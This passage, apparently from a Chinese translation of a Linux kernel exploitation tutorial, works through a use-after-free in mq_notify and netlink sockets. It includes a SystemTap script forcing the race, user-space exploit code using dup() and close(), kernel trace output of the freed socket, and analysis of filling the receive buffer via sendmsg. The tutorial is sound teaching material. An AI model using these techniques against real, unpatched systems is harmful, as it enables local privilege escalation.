cb_running;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_callback</span>	<span class="title">cb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		*<span class="title">cb_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">cb_def_mutex</span>;</span></span><br><span class="line">	<span class="keyword">void</span>			(*netlink_rcv)(struct sk_buff *skb);</span><br><span class="line">	<span class="keyword">int</span>			(*netlink_bind)(<span class="keyword">int</span> group);</span><br><span class="line">	<span class="keyword">void</span>			(*netlink_unbind)(<span class="keyword">int</span> group);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span>		*<span class="title">module</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">  nlk-&gt;state |= <span class="number">1</span>;   <span class="comment">// enter the netlink_attachskb() retry path    </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> We do not mark the sock as DEAD anymore</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">function force_trigger_after:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">  fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function(<span class="string">&quot;netlink_attachskb&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (execname()==<span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) &gt;&gt;&gt; netlink_attachskb (%s)\n&quot;</span>, pid(), tid(), $$parms)</span><br><span class="line">		force_trigger_before($sk)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function(<span class="string">&quot;netlink_attachskb&quot;</span>).<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (execname()==<span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) &lt;&lt;&lt; netlink_attachskb = %x\n&quot;</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">		force_trigger_after(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在netlink_attachskb()中被阻塞5秒，然后另一线程将主线程恢复并使得netlink_attachskb()返回了1。</p>
<p>在本节中，我们知道了如何控制竞争并无限延长窗口（设置为了5秒）。然后我们使用setsockopt唤醒主线程。 我们还介绍了可能在我们的漏洞利用中发生的条件竞争，我们了解了如何通过简单的技巧降低其发生概率。最后，我们仅使用用户态代码删除了由旧脚本满足的一个要求（将SOCK标记为DEAD）。</p>
<h3 id="Making-fget-Fail-on-Second-Loop"><a href="#Making-fget-Fail-on-Second-Loop" class="headerlink" title="Making fget() Fail on Second Loop"></a>Making <em>fget()</em> Fail on Second Loop</h3><p>到此为止，我们还有两个要求需要满足：</p>
<ol>
<li>强制netlink_attachskb()返回1</li>
<li>强制第二次fget()返回NULL</li>
<li>[已完成]唤醒主线程</li>
</ol>
<p>在本章节中，我们将会尝试让第二次fget()返回NULL，这将让我们在第二次循环中进入到exit的路径：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">retry:</span><br><span class="line">	filp = fget(notification.sigev_signo);</span><br><span class="line">	<span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">		ret = -EBADF;</span><br><span class="line">		<span class="keyword">goto</span> out;           <span class="comment">// &lt;--------- on the second loop only!</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么fget-会返回NULL"><a href="#为什么fget-会返回NULL" class="headerlink" title="为什么fget()会返回NULL"></a>为什么fget()会返回NULL</h4><p>通过System Tap，重置目标fd的FDT项能够使得fget()返回NULL：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br></pre></td></tr></table></figure>

<p>**fget()**所做的事：</p>
<ol>
<li>获得<em>current</em>进程的结构体files_struct</li>
<li>获得结构体files_struct的fdtable结构体</li>
<li>获得fdt-&gt;fd[fd]的值</li>
<li>将file结构体的refcounter（如果不为NULL）递增1</li>
<li>返回file结构体的指针</li>
</ol>
<p>简而言之，如果特定文件描述符的FDT条目为NULL，则fget()返回NULL。</p>
<h4 id="Reset-an-Entry-in-the-File-Descriptor-Table"><a href="#Reset-an-Entry-in-the-File-Descriptor-Table" class="headerlink" title="Reset an Entry in the File Descriptor Table"></a>Reset an Entry in the File Descriptor Table</h4><p>在STAP脚本中，我们重置了fd 3的fdt入口。我们如何在用户态中完成这件事？有什么办法可以设置fdt？答案就是close()系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// [fs/open.c]</span></span><br><span class="line"></span><br><span class="line">    SYSCALL_DEFINE1(close, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">      <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   fdt = files_fdtable(files);</span><br><span class="line">[<span class="number">1</span>]   filp = fdt-&gt;fd[fd];</span><br><span class="line">[<span class="number">2</span>]   rcu_assign_pointer(fdt-&gt;fd[fd], <span class="literal">NULL</span>); <span class="comment">// &lt;----- equivalent to: fdt-&gt;fd[fd] = NULL</span></span><br><span class="line">[<span class="number">3</span>]   retval = filp_close(filp, files);</span><br><span class="line">      <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>close()系统调用：</p>
<ul>
<li>[0] - 获得当前进程的FDT</li>
<li>[1] - 通过FDT获得指定fd的file结构体</li>
<li>[2] - <strong>将相应的FDT项设置为NULL（无条件）</strong></li>
<li>[3] - 将file的引用减去1（即调用fput()）</li>
</ul>
<p>因此，这种简单的方法可以重置FDT条目。 然而，它带来了另一个问题。</p>
<h4 id="An-Egg-and-Chicken-Issue…"><a href="#An-Egg-and-Chicken-Issue…" class="headerlink" title="An Egg and Chicken Issue…"></a>An Egg and Chicken Issue…</h4><p>在调用setsockopt()之前调用unblock_thread中的close()是很诱人的。问题是setsockopt()需要一个有效的文件描述符。我们已经通过STAP尝试过它，这就是为什么我们在从netlink_attachskb()返回时添加了fdt重置的代码，而不是netlink_attachskb()调用之前。我们在用户态中遇到同样的问题……</p>
<p>在setsocktopt()之后调用close()会怎么样？如果我们在调用setsockopt()（唤醒主线程）之后调用close()，就不利用扩展的条件竞争的窗口。我们不希望这样。</p>
<p>幸运的是，在Core Concept＃1中，已经说过文件描述符表不是1：1映射。也就是说，几个文件描述符可能指向同一个文件对象。如何使两个文件描述符指向相同的struct文件？使用dup()系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// [fs/fcntl.c]</span></span><br><span class="line"></span><br><span class="line">    SYSCALL_DEFINE1(dup, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fildes)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> ret = -EBADF;</span><br><span class="line">[<span class="number">0</span>]   <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> = <span class="title">fget</span>(<span class="title">fildes</span>);</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (file) &#123;</span><br><span class="line">[<span class="number">1</span>]     ret = get_unused_fd();</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">[<span class="number">2</span>]       fd_install(ret, file); <span class="comment">// &lt;----- equivalent to: current-&gt;files-&gt;fdt-&gt;fd[ret] = file</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          fput(file);</span><br><span class="line">      &#125;</span><br><span class="line">[<span class="number">3</span>]   <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>dup()的操作正式我们想要的：</p>
<ul>
<li>[0] - 从文件描述符中获取文件对象的引用</li>
<li>[1] - 选择一个可用的fd</li>
<li>[2] - 使用指向struct file对象的指针设置此新文件描述符的fdt条目</li>
<li>[3] - 返回新的fd</li>
</ul>
<p>最后，我们将拥有两个引用相同file结构体的文件描述符：</p>
<ul>
<li><strong>sock_fd</strong>：被mq_notify()和close()使用</li>
<li><strong>unblock_fd</strong>：被setsockopt()使用</li>
</ul>
<h4 id="更新Exploit"><a href="#更新Exploit" class="headerlink" title="更新Exploit"></a>更新Exploit</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> sock_fd;</span><br><span class="line">  <span class="keyword">int</span> unblock_fd;     <span class="comment">// &lt;----- used by the &quot;unblock_thread&quot;</span></span><br><span class="line">  <span class="keyword">bool</span> is_ready;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">unblock_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">5</span>); <span class="comment">// gives some time for the main thread to block</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[unblock] closing %d fd\n&quot;</span>, uta-&gt;sock_fd);</span><br><span class="line">  _close(uta-&gt;sock_fd);                               <span class="comment">// &lt;----- close() before setsockopt()</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[unblock] unblocking now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(uta-&gt;unblock_fd, SOL_NETLINK,       <span class="comment">// &lt;----- use &quot;unblock_fd&quot; now!</span></span><br><span class="line">                  NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">    perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((uta.unblock_fd = _dup(uta.sock_fd)) &lt; <span class="number">0</span>)         <span class="comment">// &lt;----- dup() after socket() </span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[main] netlink fd duplicated = %d\n&quot;</span>, uta.unblock_fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>移除STAP脚本中的FDT清空代码后执行。测试结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(2853-2853) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffdc2f2f1b0)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2853) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2853) &gt;&gt;&gt; skb_put (skb=0xffff88003e3c1e00 len=0x20)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; skb_put = ffff880037398000</span><br><span class="line">(2853-2853) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; __fdget = ffff880038cb1501</span><br><span class="line">(2853-2853) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880038cb1500)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003b8f9800</span><br><span class="line">(2853-2853) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003b8f9800 skb=0xffff88003e3c1e00 timeo=0xffff880036ad3f08 ssk=0x0)</span><br><span class="line">(2853-2854) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(2853-2854) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2854) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(2853-2854) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2854) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(2853-2854) &lt;&lt;&lt; __fdget = ffff880038cb1501</span><br><span class="line">(2853-2853) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(2853-2853) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(2853-2853) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003b8f9800 skb=0xffff88003e3c1e00)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; kfree (objp=0xffff880037398000)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; kfree (objp=0xffff88003b8f9800)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003b8f9800 &#125;=-</span><br><span class="line">- sk = 0xffff88003b8f9800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 0</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(2853-2853) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>

<p><em>Long story short: because of dup(), calling close() will not release a reference on netlink_sock object. It is the netlink_detachskb() that actually releases the last reference on netlink_sock (and frees it). In the end, the use-after-free is triggered during program exit, while releasing the “unblock_fd” file descriptor (in netlink_release()).</em></p>
<blockquote>
<p>原文中触发了Kernel Panic，但是实际测试的时候并没有导致Kernel Panic，为了验证所使用的系统的正确性，使用了本文后续的poc进行验证，是能够导致Kernel Panic的，不知道本章节的exploit的问题在哪。</p>
</blockquote>
<h3 id="Looping-back-to-“retry”-label"><a href="#Looping-back-to-“retry”-label" class="headerlink" title="Looping back to “retry” label"></a>Looping back to “retry” label</h3><p>来看下我们的待办事项：</p>
<ol>
<li>强制netlink_attachskb()返回1</li>
<li>[已完成]强制第二次fget()返回NULL</li>
<li>[已完成]唤醒主线程</li>
</ol>
<p>为了到达<strong>retry</strong>标签，就需要**netlink_attachskb()**返回1。唯一的办法就是需要满足下列条件并唤醒线程（这个条件已经满足）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line">      nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// ... cut ...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// normal path</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>[0]的条件为True的要求：</p>
<ol>
<li><strong>sk_rmem_alloc</strong>的值比<strong>sk_rcvbuf</strong>大，或者</li>
<li><strong>nlk-&gt;state</strong>的最低比特位被设置</li>
</ol>
<p>我们现在所使用的办法是用STAP脚本强制修改<strong>nlk-&gt;state</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">nlk-&gt;state |= <span class="number">1</span>;      </span><br></pre></td></tr></table></figure>

<p>但是实际中如果要这么设置，就只能让内核内存分配失败。这将会导致系统处于一个不稳定的状态从而影响我们的exploit。所以我们只能尝试增加<strong>sk_rmem_alloc</strong>的值，这个值用于表示“当前”sock的接收buf的大小。</p>
<h4 id="Filling-The-Receive-Buffer"><a href="#Filling-The-Receive-Buffer" class="headerlink" title="Filling The Receive Buffer"></a>Filling The Receive Buffer</h4><p>在这一小节中，我们尝试满足第一个条件。满足这个条件意味着接收buf是否已满：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf</span><br></pre></td></tr></table></figure>

<p>sock结构体（包含在netlink_sock结构体中）有以下属性：</p>
<ul>
<li><strong>sk_rcvbuf</strong>：理论上接收buf大小的最大值（字节数）</li>
<li><strong>sk_rmem_alloc</strong>：当前接收buf的大小（字节数）</li>
<li><strong>sk_receive_queue</strong>：”skb”双向链表 (i.e. network buffers)</li>
</ul>
<p><strong>NOTE</strong>：“理论上”的意思是，<strong>sk_rmem_alloc</strong>实际上是可以超过<strong>sk_rcvbuf</strong>的。</p>
<p>在Part 1中我们使用STAP输出了netlink sock结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">- sk-&gt;sk_rmem_alloc = <span class="number">0</span></span><br><span class="line">- sk-&gt;sk_rcvbuf = <span class="number">133120</span></span><br></pre></td></tr></table></figure>

<p>我们有两种办法来满足这个条件：</p>
<ol>
<li>将sk_rcvbuf减到0一下（类型是int）</li>
<li>增加sk_rmem_alloc到133120以上</li>
</ol>
<h4 id="Lowering-sk-rcvbuf"><a href="#Lowering-sk-rcvbuf" class="headerlink" title="Lowering sk_rcvbuf"></a>Lowering sk_rcvbuf</h4><p><em>sk_rcvbuf</em>在sock对象中十分常见，但netlink socket并没有很多地方对其值进行了修改。有一处就是<strong>sock_setsockopt</strong>（使用SOL_SOCKET可达）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// from [net/core/sock.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sock_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">      <span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut  ...</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> SO_RCVBUF:</span><br><span class="line">[<span class="number">0</span>]     <span class="keyword">if</span> (val &gt; sysctl_rmem_max)</span><br><span class="line">          val = sysctl_rmem_max;</span><br><span class="line">    set_rcvbuf:</span><br><span class="line">        sk-&gt;sk_userlocks |= SOCK_RCVBUF_LOCK;</span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> ((val * <span class="number">2</span>) &lt; SOCK_MIN_RCVBUF)</span><br><span class="line">          sk-&gt;sk_rcvbuf = SOCK_MIN_RCVBUF;          </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">          sk-&gt;sk_rcvbuf = val * <span class="number">2</span>;                 </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ... cut (other options handling) ...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当见到诸如此类的代码时，<strong>注意每一个参数的类型</strong>。</p>
<p><strong>注意</strong>：A lot of bugs exist because of this “signed/unsigned type mixing”. The same goes when casting a bigger type (u64) to a smaller type (u32). This often leads to <em>int overflow</em> or <em>type casting</em> issues.</p>
<p>在上述代码中（可能因内核版本不一而不一样）：</p>
<ul>
<li><strong>sk_rcvbuf</strong>: int</li>
<li><strong>val</strong>: int</li>
<li><strong>sysctl_rmem_max</strong>: __u32</li>
<li><strong>SOCK_MIN_RCVBUF</strong>: “promoted” to size_t because of “sizeof()”</li>
</ul>
<p>SOCK_MIN_RCVBUF定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff))</span></span><br></pre></td></tr></table></figure>

<p>总而言之，当混合signed int和unsigned int时，signed int会被转换为unsigned int。</p>
<p><strong>WARNING</strong>：不同的编译器可能有不同的策略，以汇编为准。</p>
<p>让我们来考虑将一个负值传递给<strong>val</strong>，代码运行至[0]，它会被转化成无符号数（因为<strong>sysctl_rmem_max</strong>是__u32），所以<strong>val</strong>在这会被重置为<em>sysctl_rmem_max</em>。如果<strong>val</strong>不被转为__u32的话，将不会通过[1]处的检查。在最后，<strong>sk_rcvbuf</strong>的取值范围为[SOCK_MIN_RCVBUF, sysctl_rmem_max]。</p>
<p>所以我们只能操作<strong>sk_rmem_alloc</strong>来达到我们的目的。</p>
<p><strong>注意</strong>：While developing an exploit you will meet this phenomenon: analyzing a lot of code paths that actually lead to <em>nowhere</em>. We wanted to expose it in this article.</p>
<h4 id="Back-to-the-“normal”-path"><a href="#Back-to-the-“normal”-path" class="headerlink" title="Back to the “normal” path"></a>Back to the “normal” path</h4><p>现在是时候回到我们自本系列一直忽略的东西：mq_notify()的normal path。从概念上讲，当sock接收buffer已满时，存在“retry path”，因为normal path可能实际填充它。</p>
<p>在netlink_attachskb()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line">  nlk = nlk_sk(sk);</span><br><span class="line">  <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line">      <span class="comment">// ... cut (retry path) ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  skb_set_owner_r(skb, sk);       <span class="comment">// &lt;----- what about this ?</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以，<em>normal path</em>调用**skb_set_owner_r()**：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">skb_set_owner_r</span><span class="params">(struct sk_buff *skb, struct sock *sk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      WARN_ON(skb-&gt;destructor);</span><br><span class="line">      __skb_orphan(skb);</span><br><span class="line">      skb-&gt;sk = sk;</span><br><span class="line">      skb-&gt;destructor = sock_rfree;</span><br><span class="line">[<span class="number">0</span>]   atomic_add(skb-&gt;truesize, &amp;sk-&gt;sk_rmem_alloc);  <span class="comment">// sk-&gt;sk_rmem_alloc += skb-&gt;truesize</span></span><br><span class="line">      sk_mem_charge(sk, skb-&gt;truesize);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>是的，<strong>skb_set_owner_r()使用skb-&gt;truesize增加sk_rmem_alloc</strong>。所以，我们是否可以多次调用mq_notify()直到接收buffer装满？不幸的是我们没办法简单的达成这件事。</p>
<p>在mq_notify()的normal path中，在函数的开头创建了一个skb(被称为cookie)，并使用netlink_attachskb()附加到netlink_sock，我们之前已经介绍过了。netlink_sock和skb都与属于消息队列的mqueue_inode_info结构相关。</p>
<p>问题是，一次只能有一个cookie “skb”与mqueue_inode_info结构相关联。也就是说，第二次调用mq_notify()将失败并显示“-EBUSY”错误。换句话说，我们只能增加sk_rmem_alloc大小一次（对于给定的消息队列），这是不够（只有32个字节）使它大于sk_rcvbuf。</p>
<p>我们实际上<em>可能</em>创建多个消息队列，因此拥有多个mqueue_inode_info对象并多次调用mq_notify()。或者，我们也可以使用mq_timedsend()系统调用将消息推送到队列中。 因为我们不想研究另一个子系统（mqueue），并且坚持使用“通用”内核路径（sendmsg），所以我们不会这样做。虽然这可能是一个很好的锻炼。</p>
<p><strong>NOTE</strong>: There are always multiple ways to code an exploit.</p>
<p>虽然我们不会采用mq_notify()的normal path，但它仍然暴露了一件重要的事情：我们可以使用skb_set_owner_r()，也就是netlink_attachskb()增加sk_rmem_alloc。</p>
<h4 id="The-netlink-unicast-path"><a href="#The-netlink-unicast-path" class="headerlink" title="The netlink_unicast() path"></a>The netlink_unicast() path</h4><p>在skb_set_owner_r()的帮助下，netlink_attachskb()可能会增加sk_rmem_alloc的值。netlink_attachskb()同样由**netlink_unicast()**调用。让我们自下而上来分析下如何通过系统调用到达netlink_unicast()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">- skb_set_owner_r</span><br><span class="line">- netlink_attachskb</span><br><span class="line">- netlink_unicast   </span><br><span class="line">- netlink_sendmsg   <span class="comment">// there is a lots of &quot;other&quot; callers of netlink_unicast</span></span><br><span class="line">- sock-&gt;ops-&gt;sendmsg()          </span><br><span class="line">- __sock_sendmsg_nosec()</span><br><span class="line">- __sock_sendmsg()</span><br><span class="line">- sock_sendmsg()</span><br><span class="line">- __sys_sendmsg()</span><br><span class="line">- SYSCALL_DEFINE3(sendmsg, ...)</span><br></pre></td></tr></table></figure>

<p>因为**netlink_sendmsg()**是netlink sockets的一个操作原型，所以我们可以通过sendmsg()系统调用到达它。</p>
<p>从sendmsg()系统调用到sendmsg的proto_ops（sock-&gt;ops-&gt;sendmsg()）的通用代码路径将在第3部分的更深入地介绍。现在，让我们假设我们可以毫不费力地访问netlink_sendmsg()。</p>
<h4 id="Reaching-netlink-unicast-from-netlink-sendmsg"><a href="#Reaching-netlink-unicast-from-netlink-sendmsg" class="headerlink" title="Reaching netlink_unicast() from netlink_sendmsg()"></a>Reaching netlink_unicast() from netlink_sendmsg()</h4><p>sendmsg()系统调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>

<p>到达netlink_unicast()需要把<em>msg</em>和<em>flags</em>设置为合适的值：</p>
